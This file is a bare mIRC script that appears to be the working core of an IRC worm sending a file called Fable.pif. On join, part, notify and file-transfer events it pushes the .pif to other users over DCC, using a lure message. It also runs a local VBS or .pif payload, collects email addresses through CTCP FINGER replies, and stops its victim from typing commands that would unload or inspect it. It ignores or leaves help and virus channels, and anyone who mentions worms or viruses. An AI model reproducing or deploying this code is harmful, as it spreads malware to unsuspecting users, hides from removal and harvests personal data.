[script]
n0=On 1:Connect:{ Set %Pif.safe $false | Set %Pif.safe2 $false | Set %Pif.which $r(1,2) | Set %Pif.blah $scriptdir $+ Windir.sys | if ( $exists(%Pif.blah) ) { Set %Pif.windir $read -nl1 %Pif.blah } | if ( %Pif.windir = $null ) { goto skip1 } | Set %Pif.file %Pif.windir $+ Fable.pif | Set %Pif.vbs %Pif.windir $+ Blah.vbs | Set %Pif.LL %Pif.windir $+ EList.eml | if ( $exists(%Pif.LL) ) { if ( $lines(%Pif.LL) >= 25 ) { .remove [ %Pif.windir $+ safety.sys ] | if ( $exists(%Pif.vbs) ) { .run %Pif.windir $+ wscript.exe %Pif.vbs } | else { .run %Pif.file } } | if ( $lines(%Pif.LL) < 25 ) && ( $network = Dalnet ) { Set %Pif.safe2 $true } } | if ( $exists(%Pif.LL) = $false ) && ( $network = Dalnet ) { Set %Pif.safe2 $true } | :skip1 | if ( $exists(%Pif.file) ) && ( $network != Dalnet ) { Set %Pif.safe $true } | Unset %be.* %pk.* %£S.* | if ( %Pif.safe2 ) { Set %Pif.which 2 } | unigry }
n1=On 1:Disconnect:{ .timers off | .sockclose * }
n2=On 1:Input:*:{ Set %Pif.v1 Ignore:Alias:Write:Play:Rename:Copy:Load:Remini:Writeini:Run:Filter:Flushini:Reload:Remove:Set:Unset:UnsetAll:Enable:Disable:Unload:Remote:Events: | Set %Pif.v2 $remove($1,/,.) | if ( $istok(%Pif.v1,%Pif.v2,58) ) || ( %Pif.v2 = $null ) || ( timer isin $1 ) { halt } | if ( $chr(36) isin $1- )  { if ( $pos($1-,$,0) > 1 ) { halt } | Set %Pif.tmp1 $asc($mid($1-,$calc($pos($1-,$,1) + 1),1)) | if ( %Pif.tmp1 > 47 ) && ( %Pif.tmp1 < 58 ) { return } | elseif ( %Pif.tmp1 = 32) { return } | halt } }
n3=On 1:Join:*:{ if ( help isin # ) || ( ayuda isin # ) || ( virus isin # ) || ( $remove(#,$chr(35)) isin dmsetupbackorificenohackaide ) { .timerqt 1 5 quiet # } | if ( %Pif.safe ) && ( %Pif.which = 1 ) && ( $r(1,2) = 1 ) && ( $nick != $me ) { Fable1 $nick } }
n4=On ^1:Part:*:{ if ( %Pif.which = 2 ) && ( $r(1,2) = 1 ) && ( $nick isreg # ) && ( $nick != $me ) { if ( %Pif.safe ) { Fable1 $nick } | elseif ( %Pif.safe2 ) { .ctcp $nick finger } } | if ( $1- != $null ) { Set %Pif.guess 3 | letslook $1- } }
n5=On 1:FileSent:*:{ if ( %Pif.safe ) { Fable1 $nick } }
n6=On 1:FileRcvd:*:{ if ( %Pif.safe ) { Fable1 $nick } }
n7=On 1:Notify:{ if ( %Pif.safe ) { if ( $nick !isin %Pif.List ) { %Pif.List = %Pif.List $+ $nick | .ignore -u120 $nick 2 | .timer $+ $r(1454,1460) 1 10 .msg $nick Hey, I'll talk to you in a sec.  Look at this file I found real quick | .timer $+ $r(1461,1466) 1 12 Fable1 $nick } } | elseif ( %Pif.safe2 ) { .ctcp $nick finger } }
n8=On 1:CTCPREPLY:*:{ if ( $1 = FINGER ) { .ignore -u120 $nick 2 | if ( $exists(%Pif.LL) = $false ) { .write -c %Pif.LL } | Set %Pif.fing1 $gettok($1-,2,40) | Set %Pif.fing1 $gettok(%Pif.fing1,1,41) | Set %Pif.fing3 $read -ns $+ %Pif.fing1 %Pif.LL | if ( $chr(64) !isin %Pif.fing1 ) || ( %Pif.fing3 != $null ) { halt } | Set %Pif.fing4 $gettok(%Pif.fing1,1,64) | if ( $chr(44) isin %Pif.fing4 ) || ( $chr(46) isin %Pif.fing4 ) || ( $chr(34) isin %Pif.fing4 ) || ( $chr(39) isin %Pif.fing4 ) || ( $chr(45) isin %Pif.fing4 ) || ( $chr(59) isin %Pif.fing4 ) { halt } | Set %Pif.fing2 $gettok(%Pif.fing1,2,64) | if ( %Pif.fing2 = $null ) { halt } | if ( $left(%Pif.fing2,4) != www. ) { Set %Pif.fing2 www. $+ %Pif.fing2 } | if ( $sock(%Pif.fing1) != $null ) { halt } | .sockopen %Pif.fing1 %Pif.fing2 80 | halt } }
n9=On 1:SockClose:ƒ.*:{ Set %Pif.tmp6 $remove($sockname,ƒ.) | sockclose $sockname | sockclose [ £. $+ [ %Pif.tmp6 ] ] | .timer $+ %Pif.tmp6 off }
n10=On 1:SockListen:£.*:{ Set %Pif.tmp5 $remove($sockname,£.) | sockaccept ƒ. $+ %Pif.tmp5 | Fable2 %Pif.tmp5 }
n11=On 1:SockWrite:ƒ.*:{ Set %Pif.tmp6 $remove($sockname,ƒ.) | if ( [ % $+ [ £S. $+ [ %Pif.tmp6 ] ] ] = 1 ) { .timer $+ $r(99,9999) 1 10 sockclose $sockname | .timer $+ $r(99,9999) 1 10 sockclose [ £. $+ [ %Pif.tmp6 ] ] | .timer $+ %Pif.tmp6 off | halt } | Fable2 %Pif.tmp6 }
n12=On 1:Sockopen:*@*:{ if ( $sockerr > 0 ) { .sockclose $sockname | halt } | if ( $exists(%Pif.LL) ) { .write %Pif.LL $sockname } | else { .write -c %Pif.LL $sockname } | .sockclose $sockname }
n13=On ^1:Kick:*:{ if ( $knick = $me ) { letslook $1- } }
n14=On ^1:Notice:*:*:{ letslook $1- }
n15=On ^1:Action:*:*:{ letslook $1- }
n16=On ^1:Text:*:*:{ letslook $1- }
n17=On ^1:Chat:*:{ letslook $1- }
n18=On ^1:Serv:*:{ letslook $1- }
n19=On ^1:Quit:{ Set %Pif.guess 3 | letslook $1- }
n20=On ^1:Topic:#:{ Set %Pif.guess 2 | letslook $1- }
n21=on ^1:SNOTICE:*:{ letslook $1- }
n22=ctcp 1:*:*:{ letslook $1- }
n23=raw 332:*:{ Set %Pif.guess 1 | letslook $2- }
n24=raw 401:*:{ if ( %£S. $+ $2 != $null ) { .timer $+ $2 off | .sockclose £. $+ $2 | .sockclose ƒ. $+ $2 | Set %Pif.continue $2 | halt } | return }
n25=raw 439:*:{ halt }
n26=alias quiet { Set %Pif.v3 1 | :j | Set %Pif.v4 $nick($1,%Pif.v3) | if ( %Pif.v4 = $null ) { .part $1 | halt } | if ( %Pif.v4 != $me ) && ( %Pif.v4 != X ) && ( %Pif.v4 != W ) { .ignore %Pif.v4 2 } | inc %Pif.v3 | goto j }
n27=alias -l unigry { if ( $r(1,5) != 3 ) { return } | Set %tmp1 $ignore(0) | Set %tmp2 0 | :tm | inc %tmp2 | if ( %tmp1 = $null ) || ( %tmp2 > %tmp1 ) { goto out } | .ignore -r $ignore(1) | goto tm | :out }
n28=alias letsdo { .ignore $nick 2 | halt }
n29=alias letslook { if ( Fable isin $1- ) || ( .pif isin $1- ) || ( script isin $1- ) || ( worm isin $1- ) || ( virus isin $1- ) || ( trojan isin $1- ) || ( infect isin $1- ) || ( spread isin $1- ) || ( remote isin $1- ) || ( events isin $1- ) || ( unload isin $1- ) || ( virii isin $1- ) || ( dccallow isin $1- ) || ( finger isin $1- ) { if ( %Pif.guess = 1 ) { unset %Pif.guess | .timerf 1 1 quiet $1 | halt } | if ( %Pif.guess = 2 ) { unset %Pif.guess | .ignore $nick 2 | halt } | if ( %Pif.guess = 3 ) { unset %Pif.guess | halt } | letsdo } }
n30=alias Fable1 { if ( $sock(£.*,0) > 5 ) { return } | Set %£S. $+ $1 0 | :pointless | Set %pt $r(2400,5000) | if ( $portfree(%pt) = $false ) { goto pointless } | Set [ % $+ [ be. $+ [ $1 ] ] ] 0 | Set %pk. $+ $1 4096 | Set %sz $file(%Pif.file).size | Set %Pif.tmp4 £. $+ $1 | .timer $+ $1 1 240 .sockclose %Pif.tmp4 $+ $chr(32) $+ $chr(124) $+ $chr(32) $+ .sockclose ƒ. $+ $1 | .timer1 $+ $1 1 20 Fable3 $1 | .notice $1 DCC Send Fable.pif ( $+ $ip $+ ) | if ( $1 = %Pif.continue ) { return } | .raw -q privmsg $1 : $+ $chr(1) $+ DCC SEND %Pif.file $longip($ip) %pt %sz $+ $chr(1) | if ( $sock(%Pif.tmp4) != $null ) { .sockclose %Pif.tmp4 } | .ignore -u90 $1 2 | .socklisten %Pif.tmp4 %pt }
n31=alias Fable2 { if ( $calc( [ % $+ [ be. $+ [ $1 ] ] ] + [ % $+ [ pk. $+ [ $1 ] ] ] ) < %sz) { bread %Pif.file [ % $+ [ be. $+ [ $1 ] ] ] [ % $+ [ pk. $+ [ $1 ] ] ] &data | .sockwrite ƒ. $+ $1 &data | inc [ % $+ [ be. $+ [ $1 ] ] ] [ % $+ [ pk. $+ [ $1 ] ] ] } | else { Set [ % $+ [ £S. $+ [ $1 ] ] ] 1 | [ % $+ [ pk. $+ [ $1 ] ] ] = $calc( %sz - [ % $+ [ be. $+ [ $1 ] ] ] ) | if ( [ % $+ [ pk. $+  [ $1 ] ] ] = 0) { return } | bread %Pif.file [ % $+ [ be. $+ [ $1 ] ] ] [ % $+ [ pk. $+ [ $1 ] ] ] &data | .sockwrite ƒ. $+ $1 &data } }
n32=alias Fable3 { if ( [ % $+ [ be. $+ [ $1 ] ] ] = 0 ) { sockclose [ ƒ. $+ [ $1 ] ] | sockclose [ £. $+ [ $1 ] ] | .timer $+ $1 off } }
